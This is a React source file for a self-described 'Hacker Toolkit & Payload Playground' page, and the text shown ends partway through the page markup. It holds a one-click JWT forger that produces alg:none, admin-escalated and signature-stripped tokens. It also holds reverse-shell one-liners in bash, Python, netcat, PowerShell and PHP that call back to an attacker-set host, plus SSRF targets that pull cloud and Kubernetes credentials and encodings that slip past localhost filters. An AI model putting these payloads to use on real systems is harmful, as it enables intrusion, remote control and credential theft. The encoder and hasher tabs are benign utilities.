"use client";

import React, { useState, useEffect, useMemo } from "react";
import {
  Key,
  Code2,
  Terminal,
  Hash,
  Copy,
  Check,
  Zap,
  ShieldAlert,
  ArrowRightLeft,
  AlertCircle,
  Unlock,
  Layers,
  Sparkles,
  RotateCcw
} from "lucide-react";

export default function ToolsPage() {
  const [activeTab, setActiveTab] = useState<"jwt" | "encoder" | "payloads" | "hasher">("jwt");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  // -------------------------------------------------------------
  // TAB 1: JWT INSPECTOR & EXPLOIT GENERATOR
  // -------------------------------------------------------------
  const SAMPLE_JWT =
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3IiwidXNlcm5hbWUiOiJzdHJpeF9vcGVyYXRvciIsInJvbGUiOiJ1c2VyIiwiYWRtaW4iOmZhbHNlLCJpYXQiOjE3MjU2NDA4MDB9.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";

  const [rawJwt, setRawJwt] = useState<string>("");
  const [jwtHeader, setJwtHeader] = useState<string>("");
  const [jwtPayload, setJwtPayload] = useState<string>("");
  const [jwtSignature, setJwtSignature] = useState<string>("");
  const [jwtError, setJwtError] = useState<string>("");
  const [exploitedJwt, setExploitedJwt] = useState<string>("");

  useEffect(() => {
    if (!rawJwt.trim()) {
      setJwtHeader("");
      setJwtPayload("");
      setJwtSignature("");
      setJwtError("");
      return;
    }
    try {
      const parts = rawJwt.trim().split(".");
      if (parts.length >= 2) {
        const hDec = atob(parts[0].replace(/-/g, "+").replace(/_/g, "/"));
        const pDec = atob(parts[1].replace(/-/g, "+").replace(/_/g, "/"));
        setJwtHeader(JSON.stringify(JSON.parse(hDec), null, 2));
        setJwtPayload(JSON.stringify(JSON.parse(pDec), null, 2));
        setJwtSignature(parts[2] || "");
        setJwtError("");
      } else {
        setJwtError("Invalid JWT structure: Expected 3 segments separated by dots (.)");
      }
    } catch (e: any) {
      setJwtError("Failed to decode base64url content: " + e.message);
    }
  }, [rawJwt]);

  const jwtMetadata = useMemo(() => {
    if (!jwtHeader) return null;
    try {
      const h = JSON.parse(jwtHeader);
      const p = jwtPayload ? JSON.parse(jwtPayload) : {};
      return {
        alg: h.alg || "Unknown",
        typ: h.typ || "JWT",
        claimsCount: Object.keys(p).length,
        hasSignature: Boolean(jwtSignature)
      };
    } catch {
      return null;
    }
  }, [jwtHeader, jwtPayload, jwtSignature]);

  const toBase64Url = (str: string) =>
    btoa(str).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");

  const generateNoneAlgToken = () => {
    try {
      let hObj = { alg: "none", typ: "JWT" };
      try {
        hObj = { ...JSON.parse(jwtHeader), alg: "none" };
      } catch {}
      const pObj = jwtPayload ? JSON.parse(jwtPayload) : {};
      const hB64 = toBase64Url(JSON.stringify(hObj));
      const pB64 = toBase64Url(JSON.stringify(pObj));
      setExploitedJwt(`${hB64}.${pB64}.`);
    } catch (e: any) {
      setJwtError("Error generating alg:none token: " + e.message);
    }
  };

  const makeAdminToken = () => {
    try {
      const pObj = jwtPayload ? JSON.parse(jwtPayload) : {};
      pObj.admin = true;
      pObj.role = "admin";
      pObj.is_admin = true;
      const updatedPayload = JSON.stringify(pObj, null, 2);
      setJwtPayload(updatedPayload);

      let hObj = { alg: "none", typ: "JWT" };
      try {
        hObj = { ...JSON.parse(jwtHeader), alg: "none" };
      } catch {}

      const hB64 = toBase64Url(JSON.stringify(hObj));
      const pB64 = toBase64Url(JSON.stringify(pObj));
      setExploitedJwt(`${hB64}.${pB64}.`);
    } catch (e: any) {
      setJwtError("Error elevating privileges in payload: " + e.message);
    }
  };

  const stripSignatureToken = () => {
    try {
      let hObj = { alg: "HS256", typ: "JWT" };
      try {
        hObj = JSON.parse(jwtHeader);
      } catch {}
      const pObj = jwtPayload ? JSON.parse(jwtPayload) : {};
      const hB64 = toBase64Url(JSON.stringify(hObj));
      const pB64 = toBase64Url(JSON.stringify(pObj));
      setExploitedJwt(`${hB64}.${pB64}.`);
    } catch (e: any) {
      setJwtError("Error stripping signature: " + e.message);
    }
  };

  // -------------------------------------------------------------
  // TAB 2: MULTI-FORMAT ENCODER / DECODER
  // -------------------------------------------------------------
  const [encInput, setEncInput] = useState<string>("");
  const [encFormat, setEncFormat] = useState<
    "url" | "double_url" | "base64" | "base64url" | "hex" | "html" | "unicode"
  >("url");
  const [encMode, setEncMode] = useState<"encode" | "decode">("encode");
  const [encOutput, setEncOutput] = useState<string>("");
  const [encError, setEncError] = useState<string>("");

  useEffect(() => {
    if (!encInput) {
      setEncOutput("");
      setEncError("");
      return;
    }
    setEncError("");
    try {
      if (encMode === "encode") {
        switch (encFormat) {
          case "url":
            setEncOutput(encodeURIComponent(encInput));
            break;
          case "double_url":
            setEncOutput(encodeURIComponent(encodeURIComponent(encInput)));
            break;
          case "base64":
            setEncOutput(btoa(unescape(encodeURIComponent(encInput))));
            break;
          case "base64url":
            setEncOutput(
              btoa(unescape(encodeURIComponent(encInput)))
                .replace(/\+/g, "-")
                .replace(/\//g, "_")
                .replace(/=+$/, "")
            );
            break;
          case "hex":
            setEncOutput(
              Array.from(new TextEncoder().encode(encInput))
                .map((b) => b.toString(16).padStart(2, "0"))
                .join("")
            );
            break;
          case "html":
            setEncOutput(
              encInput.replace(/[&<>"']/g, (m) => ({
                "&": "&amp;",
                "<": "&lt;",
                ">": "&gt;",
                '"': "&quot;",
                "'": "&#x27;"
              }[m] || m))
            );
            break;
          case "unicode":
            setEncOutput(
              Array.from(encInput)
                .map((c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0"))
                .join("")
            );
            break;
        }
      } else {
        switch (encFormat) {
          case "url":
            setEncOutput(decodeURIComponent(encInput));
            break;
          case "double_url":
            setEncOutput(decodeURIComponent(decodeURIComponent(encInput)));
            break;
          case "base64":
          case "base64url": {
            let str = encInput.replace(/-/g, "+").replace(/_/g, "/");
            while (str.length % 4) str += "=";
            setEncOutput(decodeURIComponent(escape(atob(str))));
            break;
          }
          case "hex": {
            const clean = encInput.replace(/\\x/g, "").replace(/\s+/g, "");
            const bytes = [];
            for (let i = 0; i < clean.length; i += 2) {
              bytes.push(parseInt(clean.substr(i, 2), 16));
            }
            setEncOutput(new TextDecoder().decode(new Uint8Array(bytes)));
            break;
          }
          case "html": {
            const doc = new DOMParser().parseFromString(encInput, "text/html");
            setEncOutput(doc.documentElement.textContent || "");
            break;
          }
          case "unicode": {
            setEncOutput(
              encInput.replace(/\\u([0-9a-fA-F]{4})/g, (_, hex) =>
                String.fromCharCode(parseInt(hex, 16))
              )
            );
            break;
          }
        }
      }
    } catch (e: any) {
      setEncError("Transformation failed: " + e.message);
      setEncOutput("");
    }
  }, [encInput, encFormat, encMode]);

  // -------------------------------------------------------------
  // TAB 3: REVERSE SHELLS & SSRF PLAYGROUND
  // -------------------------------------------------------------
  const [lhost, setLhost] = useState("10.10.14.4");
  const [lport, setLport] = useState("4444");
  const [shellType, setShellType] = useState("/bin/bash");

  const reverseShells = [
    {
      name: "Bash TCP One-Liner",
      cmd: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
      desc: "Standard interactive Bash socket redirection"
    },
    {
      name: "Python 3 PTY Shell",
      cmd: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shellType}")'`,
      desc: "Full interactive TTY terminal shell"
    },
    {
      name: "Netcat OpenBSD FIFO",
      cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shellType} -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
      desc: "Standard fallback where nc -e is removed"
    },
    {
      name: "PowerShell In-Memory",
      cmd: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});...`,
      desc: "Windows memory-resident TCP reverse socket"
    },
    {
      name: "PHP Socket Shell",
      cmd: `php -r '$sock=fsockopen("${lhost}",${lport});exec("${shellType} -i <&3 >&3 2>&3");'`,
      desc: "Web application execution payload"
    }
  ];

  const ssrfPayloads = [
    {
      provider: "AWS EC2 IMDSv1 Credentials",
      target: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      desc: "Dumps IAM role names and access keys"
    },
    {
      provider: "AWS EC2 UserData",
      target: "http://169.254.169.254/latest/user-data",
      desc: "Instance boot scripts often containing credentials"
    },
    {
      provider: "GCP Compute Engine Token",
      target: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      desc: "GCP access token (requires Metadata-Flavor: Google)"
    },
    {
      provider: "Azure Instance Metadata",
      target: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      desc: "Azure subscription and VM metadata"
    },
    {
      provider: "Kubernetes Service Account",
      target: "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
      desc: "Pod JWT bearer token for K8s API"
    },
    {
      provider: "Localhost Bypass (Decimal IP)",
      target: "http://2130706433:80/",
      desc: "Decimal representation of 127.0.0.1"
    },
    {
      provider: "Localhost Bypass (Hex IP)",
      target: "http://0x7f000001:80/",
      desc: "Hex representation of 127.0.0.1"
    }
  ];

  // -------------------------------------------------------------
  // TAB 4: HASH IDENTIFIER & INSTANT HASHER
  // -------------------------------------------------------------
  const [hashInput, setHashInput] = useState<string>("");
  const [identifiedType, setIdentifiedType] = useState<string[]>([]);
  const [textToHash, setTextToHash] = useState<string>("");
  const [generatedHashes, setGeneratedHashes] = useState<Record<string, string>>({});

  useEffect(() => {
    const clean = hashInput.trim();
    if (!clean) {
      setIdentifiedType([]);
      return;
    }
    const len = clean.length;
    const isHex = /^[0-9a-fA-F]+$/.test(clean);
    const matches: string[] = [];

    if (clean.startsWith("$2a$") || clean.startsWith("$2b$") || clean.startsWith("$2y$")) {
      matches.push("bcrypt (Blowfish)");
    } else if (clean.startsWith("$argon2id$") || clean.startsWith("$argon2i$")) {
      matches.push("Argon2 (Password Hashing Competition)");
    } else if (clean.startsWith("$6$")) {
      matches.push("SHA-512 Crypt (Linux /etc/shadow)");
    } else if (clean.startsWith("$1$")) {
      matches.push("MD5 Crypt");
    } else if (isHex) {
      if (len === 32) matches.push("MD5", "NTLM (Windows SAM)", "MD4");
      else if (len === 40) matches.push("SHA-1", "MySQL 4.1+", "RIPEMD-160");
      else if (len === 56) matches.push("SHA-224", "SHA3-224");
      else if (len === 64) matches.push("SHA-256", "HMAC-SHA256", "Keccak-256");
      else if (len === 96) matches.push("SHA-384");
      else if (len === 128) matches.push("SHA-512", "Whirlpool");
    }

    setIdentifiedType(matches.length > 0 ? matches : ["Unknown or Non-Standard Hash Format"]);
  }, [hashInput]);

  useEffect(() => {
    async function calcHashes() {
      if (!textToHash) {
        setGeneratedHashes({});
        return;
      }
      const enc = new TextEncoder();
      const data = enc.encode(textToHash);

      const sha1Buf = await crypto.subtle.digest("SHA-1", data);
      const sha256Buf = await crypto.subtle.digest("SHA-256", data);
      const sha512Buf = await crypto.subtle.digest("SHA-512", data);

      const toHex = (buf: ArrayBuffer) =>
        Array.from(new Uint8Array(buf))
          .map((b) => b.toString(16).padStart(2, "0"))
          .join("");

      setGeneratedHashes({
        "SHA-1": toHex(sha1Buf),
        "SHA-256": toHex(sha256Buf),
        "SHA-512": toHex(sha512Buf)
      });
    }
    calcHashes();
  }, [textToHash]);

  return (
    <div className="page" style={{ height: "100%", maxWidth: "none" }}>
      {/* Page Intro Header */}
      <div className="page-intro" style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: 14, marginBottom: 16 }}>
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
            <span style={{ padding: "2px 8px", background: "rgba(225, 29, 72, 0.15)", border: "1px solid rgba(225, 29, 72, 0.3)", borderRadius: "var(--r-sm)", color: "var(--sev-critical)", fontSize: 11, fontWeight: 700, letterSpacing: "0.5px" }}>
              OFFENSIVE TOOLKIT
            </span>
            <span style={{ fontSize: 12, color: "var(--fg-3)" }}>Red Team Payloads & Cryptographic Utilities</span>
          </div>
          <h1 className="page-heading">Hacker Toolkit & Payload Playground</h1>
          <p className="page-desc">
            Integrated offensive security tools: JWT inspector & signature bypass, multi-format codecs, reverse shell generator, and SSRF filter evasions.
          </p>
        </div>

        {/* Tab Switcher */}
        <div style={{ display: "flex", background: "var(--bg-1)", padding: 3, borderRadius: "var(--r)", border: "1px solid var(--border)", gap: 2 }}>
          <button
            onClick={() => setActiveTab("jwt")}
            style={{
              display: "flex",
              alignItems: "center",
              gap: 6,
              padding: "6px 12px",
              borderRadius: "var(--r-sm)",
              fontSize: 12,
              fontWeight: 600,
              border: "none",
              cursor: "pointer",
              background: activeTab === "jwt" ? "var(--bg-4)" : "transparent",
              color: activeTab === "jwt" ? "var(--fg)" : "var(--fg-3)",
              transition: "all 0.15s"
            }}
          >
            <Key size={13} /> JWT Inspector
          </button>
          <button
            onClick={() => setActiveTab("encoder")}
            style={{
              display: "flex",
              alignItems: "center",
              gap: 6,
              padding: "6px 12px",
              borderRadius: "var(--r-sm)",
              fontSize: 12,
              fontWeight: 600,
              border: "none",
              cursor: "pointer",
              background: activeTab === "encoder" ? "var(--bg-4)" : "transparent",
              color: activeTab === "encoder" ? "var(--fg)" : "var(--fg-3)",
              transition: "all 0.15s"
            }}
          >
            <Code2 size={13} /> Encoder / Decoder
          </button>
          <button
            onClick={() => setActiveTab("payloads")}
            style={{
              display: "flex",
              alignItems: "center",
              gap: 6,
              padding: "6px 12px",
              borderRadius: "var(--r-sm)",
              fontSize: 12,
              fontWeight: 600,
              border: "none",
              cursor: "pointer",
              background: activeTab === "payloads" ? "var(--bg-4)" : "transparent",
              color: activeTab === "payloads" ? "var(--fg)" : "var(--fg-3)",
              transition: "all 0.15s"
            }}
          >
            <Terminal size={13} /> Payloads & SSRF
          </button>
          <button
            onClick={() => setActiveTab("hasher")}
            style={{
              display: "flex",
              alignItems: "center",
              gap: 6,
              padding: "6px 12px",
              borderRadius: "var(--r-sm)",
              fontSize: 12,
              fontWeight: 600,
              border: "none",
              cursor: "pointer",
              background: activeTab === "hasher" ? "var(--bg-4)" : "transparent",
              color: activeTab === "hasher" ? "var(--fg)" : "var(--fg-3)",
              transition: "all 0.15s"
            }}
          >
            <Hash size={13} /> Hasher & ID
          </button>
        </div>
      </div>

      {/* TAB CONTENT: JWT INSPECTOR */}
      {activeTab === "jwt" && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, flex: 1, minHeight: 0 }}>
          {/* Left Column: Token Input & Exploit Engine */}
          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 12, padding: 18, overflowY: "auto" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 6 }}>
              <div>
                <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                  Raw Encoded JWT
                </h2>
                <span style={{ fontSize: 11, color: "var(--fg-3)" }}>Paste header.payload.signature token</span>
              </div>
              <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
                <button
                  onClick={() => setRawJwt(SAMPLE_JWT)}
                  className="btn-secondary"
                  style={{ padding: "3px 8px", fontSize: 11 }}
                  title="Load a demo JWT to test parsing and exploit generation"
                >
                  Load Demo Token
                </button>
                {rawJwt && (
                  <button
                    onClick={() => { setRawJwt(""); setExploitedJwt(""); }}
                    className="btn-secondary"
                    style={{ padding: "3px 8px", fontSize: 11 }}
                  >
                    Clear
                  </button>
                )}
              </div>
            </div>

            <textarea
              value={rawJwt}
              onChange={(e) => setRawJwt(e.target.value)}
              style={{
                width: "100%",
                height: 120,
                padding: "10px 12px",
                background: "var(--bg-1)",
                border: "1px solid var(--border)",
                borderRadius: "var(--r)",
                color: "var(--fg)",
                fontSize: 12,
                fontFamily: "var(--font-mono)",
                lineHeight: 1.4,
                resize: "none"
              }}
              placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3In0..."
            />

            {/* Token Telemetry Bar */}
            <div style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "8px 12px",
              background: "var(--bg-2)",
              border: "1px solid var(--border)",
              borderRadius: "var(--r-sm)",
              fontSize: 11,
              color: "var(--fg-3)"
            }}>
              <span>Algorithm: <strong style={{ color: jwtMetadata ? "var(--fg)" : "var(--fg-3)" }}>{jwtMetadata?.alg || "None"}</strong></span>
              <span>Type: <strong style={{ color: "var(--fg-2)" }}>{jwtMetadata?.typ || "JWT"}</strong></span>
              <span>Claims: <strong style={{ color: "var(--fg-2)" }}>{jwtMetadata?.claimsCount ?? 0}</strong></span>
              <span>Signature: <strong style={{ color: jwtMetadata?.hasSignature ? "var(--sev-low)" : "var(--sev-medium)" }}>{jwtMetadata?.hasSignature ? "Present" : "Missing / Unsigned"}</strong></span>
            </div>

            {jwtError && (
              <div style={{ padding: "8px 12px", background: "var(--sev-critical-bg)", border: "1px solid var(--sev-critical-bd)", borderRadius: "var(--r-sm)", color: "var(--sev-critical)", fontSize: 12, display: "flex", alignItems: "center", gap: 6 }}>
                <AlertCircle size={14} /> {jwtError}
              </div>
            )}

            {/* 1-Click Exploit Vector Studio */}
            <div style={{ display: "flex", flexDirection: "column", gap: 10, padding: 14, background: "var(--bg-2)", border: "1px solid var(--border)", borderRadius: "var(--r)" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 11.5, fontWeight: 700, color: "var(--sev-critical)", textTransform: "uppercase" }}>
                <Zap size={14} /> 1-Click Exploit & Bypass Vectors
              </div>

              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                <button
                  onClick={generateNoneAlgToken}
                  className="btn-primary"
                  style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, fontSize: 11.5, padding: "8px 10px", background: "var(--sev-critical)", color: "#fff", border: "1px solid var(--sev-critical-bd)" }}
                  title="Changes header to alg: none and strips cryptographic signature"
                >
                  <Unlock size={13} /> Bypass: Set alg: &quot;none&quot;
                </button>

                <button
                  onClick={makeAdminToken}
                  className="btn-secondary"
                  style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, fontSize: 11.5, padding: "8px 10px" }}
                  title="Injects admin: true and role: admin into claims"
                >
                  <ShieldAlert size={13} /> Escalate: admin=true
                </button>
              </div>

              <div style={{ display: "flex", gap: 8 }}>
                <button
                  onClick={stripSignatureToken}
                  className="btn-secondary"
                  style={{ width: "100%", display: "flex", alignItems: "center", justifyContent: "center", gap: 6, fontSize: 11.5, padding: "6px 10px" }}
                  title="Drops signature bytes while leaving algorithm intact"
                >
                  <RotateCcw size={13} /> Strip Signature Only (Null Signature)
                </button>
              </div>
            </div>

            {/* Forged Exploit Output */}
            <div style={{ display: "flex", flexDirection: "column", gap: 8, marginTop: "auto" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <span style={{ fontSize: 11, fontWeight: 700, color: exploitedJwt ? "var(--sev-low)" : "var(--fg-3)", textTransform: "uppercase" }}>
                  Forged Token Output {exploitedJwt && "(Ready to replay)"}
                </span>
                {exploitedJwt && (
                  <button
                    onClick={() => copyToClipboard(exploitedJwt, "forged_jwt")}
                    className="btn-secondary"
                    style={{ padding: "3px 8px", fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
                  >
                    {copiedId === "forged_jwt" ? <Check size={12} /> : <Copy size={12} />}
                    {copiedId === "forged_jwt" ? "Copied!" : "Copy Token"}
                  </button>
                )}
              </div>
              <div style={{
                padding: "10px 12px",
                background: "rgba(0,0,0,0.3)",
                border: `1px solid ${exploitedJwt ? "var(--sev-low-bd)" : "var(--border)"}`,
                borderRadius: "var(--r-sm)",
                fontFamily: "var(--font-mono)",
                fontSize: 11.5,
                color: exploitedJwt ? "var(--sev-low)" : "var(--fg-3)",
                wordBreak: "break-all",
                minHeight: 48,
                display: "flex",
                alignItems: "center"
              }}>
                {exploitedJwt || "No exploit generated yet. Click an exploit vector above to forge an unauthorized token."}
              </div>
            </div>
          </div>

          {/* Right Column: Decoded Components (Balanced Symmetrical Layout) */}
          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 12, padding: 18, overflowY: "auto" }}>
            {/* Header Segment */}
            <div>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
                <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                  <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#ef4444" }} />
                  <span style={{ fontSize: 11.5, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
                    Header (Algorithm & Token Type)
                  </span>
                </div>
                {jwtHeader && (
                  <button
                    onClick={() => copyToClipboard(jwtHeader, "jwt_header")}
                    style={{ background: "none", border: "none", color: "var(--fg-3)", cursor: "pointer", fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
                  >
                    {copiedId === "jwt_header" ? <Check size={11} /> : <Copy size={11} />} Copy
                  </button>
                )}
              </div>
              <textarea
                value={jwtHeader}
                onChange={(e) => setJwtHeader(e.target.value)}
                style={{
                  width: "100%",
                  height: 90,
                  padding: "10px",
                  background: "var(--bg-1)",
                  border: "1px solid var(--border)",
                  borderRadius: "var(--r-sm)",
                  color: "#ef4444",
                  fontSize: 12,
                  fontFamily: "var(--font-mono)",
                  resize: "none"
                }}
                placeholder='{"alg": "HS256", "typ": "JWT"}'
              />
            </div>

            {/* Payload Claims Segment */}
            <div style={{ flex: 1, display: "flex", flexDirection: "column" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
                <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                  <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#a855f7" }} />
                  <span style={{ fontSize: 11.5, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
                    Payload (Claims & User Data - Live Editable)
                  </span>
                </div>
                {jwtPayload && (
                  <button
                    onClick={() => copyToClipboard(jwtPayload, "jwt_payload")}
                    style={{ background: "none", border: "none", color: "var(--fg-3)", cursor: "pointer", fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
                  >
                    {copiedId === "jwt_payload" ? <Check size={11} /> : <Copy size={11} />} Copy
                  </button>
                )}
              </div>
              <textarea
                value={jwtPayload}
                onChange={(e) => setJwtPayload(e.target.value)}
                style={{
                  width: "100%",
                  flex: 1,
                  minHeight: 180,
                  padding: "10px",
                  background: "var(--bg-1)",
                  border: "1px solid var(--border)",
                  borderRadius: "var(--r-sm)",
                  color: "#a855f7",
                  fontSize: 12,
                  fontFamily: "var(--font-mono)",
                  resize: "none"
                }}
                placeholder='{"sub": "1337", "role": "admin"}'
              />
            </div>

            {/* Signature Segment */}
            <div>
              <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 6 }}>
                <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#3b82f6" }} />
                <span style={{ fontSize: 11.5, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
                  Signature (Verification)
                </span>
              </div>
              <div style={{
                padding: "8px 10px",
                background: "var(--bg-1)",
                border: "1px solid var(--border)",
                borderRadius: "var(--r-sm)",
                color: jwtSignature ? "#3b82f6" : "var(--fg-3)",
                fontSize: 11,
                fontFamily: "var(--font-mono)",
                wordBreak: "break-all"
              }}>
                {jwtSignature || "(Empty Signature / Unsigned alg:none)"}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB CONTENT: ENCODER / DECODER */}
      {activeTab === "encoder" && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, flex: 1, minHeight: 0 }}>
          {/* Input side */}
          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18 }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                Input Payload
              </h2>
              <div style={{ display: "flex", background: "var(--bg-1)", padding: 2, borderRadius: "var(--r-sm)", border: "1px solid var(--border)" }}>
                <button
                  onClick={() => setEncMode("encode")}
                  style={{
                    padding: "3px 10px",
                    fontSize: 11,
                    fontWeight: 600,
                    border: "none",
                    borderRadius: "var(--r-sm)",
                    cursor: "pointer",
                    background: encMode === "encode" ? "var(--bg-4)" : "transparent",
                    color: encMode === "encode" ? "var(--fg)" : "var(--fg-3)"
                  }}
                >
                  Encode
                </button>
                <button
                  onClick={() => setEncMode("decode")}
                  style={{
                    padding: "3px 10px",
                    fontSize: 11,
                    fontWeight: 600,
                    border: "none",
                    borderRadius: "var(--r-sm)",
                    cursor: "pointer",
                    background: encMode === "decode" ? "var(--bg-4)" : "transparent",
                    color: encMode === "decode" ? "var(--fg)" : "var(--fg-3)"
                  }}
                >
                  Decode
                </button>
              </div>
            </div>

            <textarea
              value={encInput}
              onChange={(e) => setEncInput(e.target.value)}
              style={{
                width: "100%",
                flex: 1,
                minHeight: 240,
                padding: "12px",
                background: "var(--bg-1)",
                border: "1px solid var(--border)",
                borderRadius: "var(--r)",
                color: "var(--fg)",
                fontSize: 13,
                fontFamily: "var(--font-mono)",
                resize: "none"
              }}
              placeholder="Enter text or raw payload to transform (e.g. admin' OR 1=1;--)..."
            />

            {/* Codec Selection Pills */}
            <div>
              <span style={{ display: "block", fontSize: 11, fontWeight: 600, color: "var(--fg-3)", textTransform: "uppercase", marginBottom: 8 }}>
                Codec Format:
              </span>
              <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
                {[
                  { id: "url", label: "URL Encode" },
                  { id: "double_url", label: "Double URL" },
                  { id: "base64", label: "Base64" },
                  { id: "base64url", label: "Base64URL" },
                  { id: "hex", label: "Hexadecimal" },
                  { id: "html", label: "HTML Entities" },
                  { id: "unicode", label: "Unicode Escapes" }
                ].map((fmt) => (
                  <button
                    key={fmt.id}
                    onClick={() => setEncFormat(fmt.id as any)}
                    style={{
                      padding: "4px 10px",
                      fontSize: 11.5,
                      fontWeight: 600,
                      borderRadius: "var(--r-sm)",
                      cursor: "pointer",
                      border: `1px solid ${encFormat === fmt.id ? "var(--border-hi)" : "var(--border)"}`,
                      background: encFormat === fmt.id ? "var(--bg-4)" : "var(--bg-2)",
                      color: encFormat === fmt.id ? "var(--fg)" : "var(--fg-3)"
                    }}
                  >
                    {fmt.label}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Output side */}
          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18 }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                Output Result
              </h2>
              <div style={{ display: "flex", gap: 8 }}>
                {encOutput && (
                  <button
                    onClick={() => {
                      const temp = encInput;
                      setEncInput(encOutput);
                      setEncOutput(temp);
                    }}
                    className="btn-secondary"
                    style={{ padding: "4px 8px", fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
                    title="Swap Input and Output"
                  >
                    <ArrowRightLeft size={12} /> Swap
                  </button>
                )}
                {encOutput && (
                  <button
                    onClick={() => copyToClipboard(encOutput, "codec_output")}
                    className="btn-primary"
                    style={{ padding: "4px 10px", fontSize: 11, display: "flex", alignItems: "center", gap: 4, background: "var(--sev-critical)", color: "#fff" }}
                  >
                    {copiedId === "codec_output" ? <Check size={12} /> : <Copy size={12} />}
                    {copiedId === "codec_output" ? "Copied!" : "Copy Output"}
                  </button>
                )}
              </div>
            </div>

            {encError ? (
              <div style={{ padding: 12, background: "var(--sev-critical-bg)", border: "1px solid var(--sev-critical-bd)", borderRadius: "var(--r)", color: "var(--sev-critical)", fontSize: 12.5 }}>
                {encError}
              </div>
            ) : (
              <textarea
                readOnly
                value={encOutput}
                style={{
                  width: "100%",
                  flex: 1,
                  minHeight: 240,
                  padding: "12px",
                  background: "var(--bg-1)",
                  border: "1px solid var(--border)",
                  borderRadius: "var(--r)",
                  color: "var(--fg)",
                  fontSize: 13,
                  fontFamily: "var(--font-mono)",
                  resize: "none"
                }}
                placeholder="Transformed payload output will appear here..."
              />
            )}

            <div style={{ padding: "10px 12px", background: "var(--bg-2)", border: "1px solid var(--border)", borderRadius: "var(--r-sm)", fontSize: 11.5, color: "var(--fg-3)" }}>
              Character Count: <strong style={{ color: "var(--fg)" }}>{encOutput.length}</strong> chars · Codec: <strong style={{ color: "var(--fg)" }}>{encFormat.toUpperCase()}</strong>
            </div>
          </div>
        </div>
      )}

      {/* TAB CONTENT: PAYLOADS & SSRF */}
      {activeTab === "payloads" && (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, flex: 1, minHeight: 0 }}>
          {/* Left: Reverse Shells */}
          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18, overflowY: "auto" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                Reverse Shell One-Liners
              </h2>
              <span style={{ fontSize: 11, color: "var(--fg-3)" }}>Interactive shell templates</span>
            </div>

            {/* Config bar */}
